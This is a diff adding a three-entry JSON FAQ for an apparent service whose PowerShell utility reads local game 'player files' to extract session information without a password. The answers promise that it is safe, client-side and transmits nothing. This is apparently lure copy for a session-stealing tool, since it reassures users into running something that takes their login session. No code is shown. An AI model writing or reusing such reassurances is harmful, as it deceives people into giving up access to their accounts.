@@ -1,0 +1,14 @@
+[
+  {
+    "q": "Is this service safe to use?",
+    "a": "Yes, our tool operates entirely on the client-side. No sensitive data is transmitted to our servers during the extraction process. We prioritize user security and transparency."
+  },
+  {
+    "q": "How does this work?",
+    "a": "Our PowerShell-based utility interacts with local player files to safely retrieve necessary session information without requiring your password. It's designed to be fast and efficient."
+  },
+  {
+    "q": "Do I need any special requirements?",
+    "a": "You just need a standard Windows environment with PowerShell enabled (which is default on most systems). No additional software or complex setup is required."
+  }
+]
